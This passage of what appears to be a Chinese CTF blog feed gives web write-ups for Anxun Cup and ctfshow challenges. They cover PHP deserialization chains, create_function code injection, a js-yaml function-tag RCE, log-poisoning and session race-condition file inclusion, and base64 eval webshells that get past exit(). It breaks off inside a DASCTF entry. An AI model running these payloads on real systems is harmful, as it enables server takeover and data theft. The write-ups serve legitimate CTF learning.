        <content type="html"><![CDATA[<p>第六届安洵杯WEB赛后解题</p><span id="more"></span><h1 id="沙贝"><a href="#沙贝" class="headerlink" title="沙贝"></a>沙贝</h1><p>期末幽默了 没打 正好主办方给了docker环境 自己搭 赶紧看一下题 quick 太幽默了</p><h1 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h1><p>简单的pop链 按照当时题目环境是phpinfo中就有flag的值 那么我们就可以投机取巧</p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Good</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$g1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$gg2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gg2=<span class="keyword">new</span> <span class="title class_">Luck</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Luck</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ll2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$md5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lll3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;md5=<span class="string">&quot;K6lVldWR0SxkahncSoAp&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">To</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tt2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">You</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">You</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;y1 = <span class="keyword">new</span> <span class="title class_">Luck</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;y1-&gt;lll3 = <span class="keyword">new</span> <span class="title class_">Good</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>值得注意的是里面套了两层的md5值 可以利用脚本爆破出来 参考：<a href="https://blog.csdn.net/weixin_44511709/article/details/102912004">md5相等及碰撞绕过_md5强等于绕过-CSDN博客</a> 脚本里面有些错误并且要用python2环境</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703584524414-6cffb232-7253-4a82-b593-4d7bbf7b772a.png" alt="img"></p><p>可以打通</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703585766071-24a99e4d-069f-4e6d-9d81-68b26bdd4a39.png" alt="img"></p><p>当然这个题目考点还有原生类 只需要将最后调用phpinfo 换为Flag对象即可触发__invoke()</p><p>先扫目录在读文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703586160395-281f13e3-8bf0-4c66-bd5d-557ae009d03a.png" alt="img"></p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Good</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$g1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$gg2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gg2=<span class="keyword">new</span> <span class="title class_">Luck</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Luck</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ll2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$md5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lll3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;md5=<span class="string">&quot;K6lVldWR0SxkahncSoAp&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l1 = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">To</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tt2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">You</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="comment">#public $FilesystemIterator=&#x27;/&#x27;; #扫目录</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$SplFileObject</span>=<span class="string">&#x27;/FfffLlllLaAaaggGgGg&#x27;</span>; <span class="comment">#读文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">You</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;y1 = <span class="keyword">new</span> <span class="title class_">Luck</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;y1-&gt;lll3 = <span class="keyword">new</span> <span class="title class_">Good</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还有个知识点就是array_walk()这个函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703586540009-c58affaf-e5c8-4361-82f5-9eba342e9e3a.png" alt="img"></p><p>那么这里需要注意它不仅可以对数组还有对象 如果是对象的话就会把属性的值作为callback的第一个参数 属性名作为第二个 这里很巧妙</p><h1 id="What’s-my-name"><a href="#What’s-my-name" class="headerlink" title="What’s my name"></a>What’s my name</h1><p>考点：</p><ul><li>create_function 注入 唤起我远古的记忆 记得之前在ctfshow上做过</li></ul><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$d0g3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?:.&#123;5&#125;)*include/&#x27;</span>,<span class="variable">$d0g3</span>))&#123;</span><br><span class="line">    <span class="variable">$sorter</span>=<span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">    <span class="variable">$miao</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$d0g3</span>)==<span class="title function_ invoke__">substr</span>(<span class="variable">$miao</span>, -<span class="number">2</span>)&amp;&amp;<span class="variable">$name</span>===<span class="variable">$miao</span>)&#123;</span><br><span class="line">        <span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$d0g3</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$d0g3</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">        @<span class="variable">$miao</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;Is That My Name?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;YOU Do Not Know What is My Name!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是正则匹配规定了d0g3参数只能用<code>5个字符 +include</code>开头</p><p>然后这里有两个create_function 第一个create_function 其实用来让我们匹配这个匿名函数后两位数字的</p><p>我们来看看这个<code>$miao</code>是什么</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703594987521-a7fa3952-23cb-4998-bbe8-1c4c8bb4a04e.png" alt="img"></p><p>可以看到是<code>\000lambda_6</code>其实本质是<code>\000lambda_%d</code> 这是匿名函数的名字 并且%d是指当前第几个匿名函数 每提交一次就会+1 </p><p>因此如果我们想<code>strlen($d0g3)==substr($miao, -2)</code>条件成立 那么就需要不断发包</p><p>接下来是第二个create_function 这里考察的就是注入了 思想类似于sql注入<code>&quot;]);&#125;include(&quot;index.php&quot;);system(&quot;env&quot;);//</code></p><p>写一个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.2:9999/test/1.php&quot;</span></span><br><span class="line">params = <span class="string">&#x27;?d0g3=&quot;]);&#125;include(&quot;index.php&quot;);system(&quot;whoami&quot;);//&amp;name=\000lambda_45&#x27;</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r = requests.<span class="title function_ invoke__">get</span>(url=url+params)</span><br><span class="line">    <span class="comment">#print(r.url)</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Is That My Name?&quot;</span> not in r.text):</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>需要注意的是有时候匿名函数名称为<code>\x00lambda_%d</code>  在win环境下是<code>\000lambda_%d</code></p><h1 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h1><p>考点：</p><ul><li>js yaml</li></ul><p>审计一下 发现它可以将yaml文件解析为js对象  然后会将name渲染出来 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703601837183-7f652a5a-7fc5-4254-9ede-5738b6972634.png" alt="img"></p><p>根据<a href="http://www.npmdoc.org/js-yamlzhongwenwendangjs-yaml-jszhongwenjiaochengjiexi.html">js-yaml中文文档|js-yaml js中文教程|解析 | npm中文文档</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703602287883-d1392bbf-c523-46ad-80eb-69fb098fd193.png" alt="img"></p><p>发现支持调用函数 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703602310138-bade3abc-6938-4ef4-baf7-dab9d0ebef0a.png" alt="img"></p><p><a href="https://github.com/nodeca/js-yaml/commit/ee74ce4b4800282b2f23b776be7dc95dfe34db1c">4.0.0 released · nodeca&#x2F;js-yaml@ee74ce4</a></p><p>js-yaml的version 是3.14.1 ，跟新版本提交对比这是默认为危险模式的最后一个版本，该模式允许您使用 tag 构造任意 JS 函数。!!js&#x2F;function</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1703602369202-1ce27490-0c7c-431c-83bf-7afe84e1d60c.png" alt="img"></p><p>在模版渲染的地方,会自动调用对象的tostring方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;name&quot; : &#123; toString: !!js/function &quot;function()&#123; flag = process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /fla*&#x27;).toString(); return flag;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-文件包含</title>
      <link href="/post/ad175165.html"/>
      <url>/post/ad175165.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-文件包含</p><span id="more"></span><h1 id="WEB-78-php-filter"><a href="#WEB-78-php-filter" class="headerlink" title="WEB-78(php:&#x2F;&#x2F;filter)"></a>WEB-78(php:&#x2F;&#x2F;filter)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="WEB-79-data"><a href="#WEB-79-data" class="headerlink" title="WEB-79(data:&#x2F;&#x2F;)"></a>WEB-79(data:&#x2F;&#x2F;)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br></pre></td></tr></table></figure><h1 id="WEB-80-81-日志包含"><a href="#WEB-80-81-日志包含" class="headerlink" title="WEB-80~81(日志包含)"></a>WEB-80~81(日志包含)</h1><p>在User-Agent:写入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: bd0bccfb-<span class="number">0e49</span>-<span class="number">4</span>ac6-<span class="number">841</span>e-dc21b2cfeecb.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl0g.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.2.729509020.1680361470</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>然后访问nginx日志文件路径<code>?file=/var/log/nginx/access.log</code></p><h1 id="WEB-82-86-session-upload-progress条件竞争"><a href="#WEB-82-86-session-upload-progress条件竞争" class="headerlink" title="WEB-82~86(session.upload_progress条件竞争)"></a>WEB-82~86(session.upload_progress条件竞争)</h1><p>这道题目利用session.upload_progress进行文件包含和条件竞争</p><p>相关文章可以看这篇<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p>条件:</p><ul><li>php5.4</li><li>session.upload_progress.enabled&#x3D;on 当我们上传一个文件 php会把此次文件上传的详细信息存储在session中</li><li>session.upload_progress.cleanup &#x3D; on 上传完毕后 php立即清理对应session文件中的内容 </li><li>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS” php会报告上传进度，对我们有用的是它的值可控</li><li>session.upload_progress.prefix &#x3D; “upload_progress_” 它和上面的name prefix+name将表示为session中的键名</li><li>session.use_strict_mode&#x3D;off 这个表示我们对Cookie中的sessionid可控</li></ul><p>首先就是没有session_start()我们该怎么创建session文件</p><p>session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。  </p><p>我们在Cookie里设置PHPSESSID&#x3D;flag，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session。并产生一个键值，这个键值由<code>ini.get(&quot;session.upload_progress.prefix&quot;)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里。  </p><p>但是我们session文件上传后会被立马删除</p><p>这里就要利用条件竞争 一边一直发包一边一直去访问 总有一次能访问成功</p><p>因此我们所需要做的就是：</p><ol><li>上传文件  在Cookie&#x3D;flag</li><li>请求包中添加：PHP_SESSION_UPLOAD_PROGRESS然后内容设置为我们的恶意代码（会被写入sess_flag文件中 ）</li><li>不断的发包去条件竞争</li></ol><p>发包post数据包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>爆破的两个数据包：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1706505911944-ba0f3638-5c11-4935-adc9-e4f56f72e1f2.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/tmp/sess_flag HTTP/<span class="number">1.1</span></span><br><span class="line">Host: fd963388-<span class="number">64</span>d1-<span class="number">44</span>dc-a324-<span class="number">28</span>bdf664ad61.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.2.729509020.1680361470</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>先爆破文件上传 再爆破包含的数据包 但是两个是一起爆破的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687933498473-c07b5203-2910-4187-8f7d-990f83ee6de7.png" alt="img"></p><h1 id="WEB-87（exit死亡绕过）"><a href="#WEB-87（exit死亡绕过）" class="headerlink" title="WEB-87（exit死亡绕过）"></a>WEB-87（exit死亡绕过）</h1><p>这里面讲的很清楚<a href="https://xz.aliyun.com/t/8163#toc-2">https://xz.aliyun.com/t/8163#toc-2</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br></pre></td></tr></table></figure><p>就是这里<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>die() 跟exit()函数一样就是脚本运行到这里会退出脚本</p><p>也就是说即使我们输入一句话木马 有exit()存在那么永远运行不到我们的木马就会提前退出脚本</p><p>这里利用了<code>php://filter/write=convert.base64-decode/resource=1.php</code>注意这里是写入</p><p>将<code>$content</code>解码 利用php base64_decode函数特性去除死亡exit。</p><p>base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过</p><p>所以，当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符a后，将phpexita当做两组base64进行解码，也就绕过这个死亡exit了。</p><p>payload：</p><p>get:</p><p><code>php://filter/write=convert.base64-decode/resource=1.php</code>对其进行两次url全字符编码</p><p><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code>因为一次解码在浏览器解析 一次解码在题目中</p><p>post:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==</span><br></pre></td></tr></table></figure><p> 前两个a是用来和phpdieaa组成4个byte 也就是两组 用于base64解码 直接就干掉这个死亡die了 真的太强了</p><p> 后面的内容是一句话木马base64编码内容</p><h1 id="WEB-88-过滤"><a href="#WEB-88-过滤" class="headerlink" title="WEB-88(过滤)"></a>WEB-88(过滤)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs`没有过滤`:</span><br></pre></td></tr></table></figure><p>这里还要把用来base64补位的<code>==</code>去掉因为waf </p><p>因为&#x3D;&#x3D;只是用来补位的所以删除不会影响解码正常</p><h1 id="WEB-116-Misc"><a href="#WEB-116-Misc" class="headerlink" title="WEB-116(Misc)"></a>WEB-116(Misc)</h1><p>提一句视频剪辑的不错:)</p><p>binwalk分离出源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.php</span><br></pre></td></tr></table></figure><h1 id="WEB-117-exit死亡绕过"><a href="#WEB-117-exit死亡绕过" class="headerlink" title="WEB-117(exit死亡绕过)"></a>WEB-117(exit死亡绕过)</h1><p>大致思路和87一样 不过这里waf了base64 换种解码方式就行了</p><p>直接偷别人的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687942245432-fcfe9ce3-7c53-4a65-a0d6-05b1887e1005.png" alt="img"></p><p>payload由来：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687943128967-696125f6-abaa-4345-af21-c3fc05850137.png" alt="img"></p><h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>文件包含难度还行 keep hacking！ 开启下一大陆 php特性 ！</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023 &amp; 0X401七月暑期挑战赛 部分WEB复现与学习</title>
      <link href="/post/731522c3.html"/>
      <url>/post/731522c3.html</url>
      
        <content type="html"><![CDATA[<p>DASCTF 2023 &amp; 0X401七月暑期挑战赛 部分WEB复现与学习</p><span id="more"></span><h1 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h1><p>跟标题就是flask有关的 进入题目直接给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 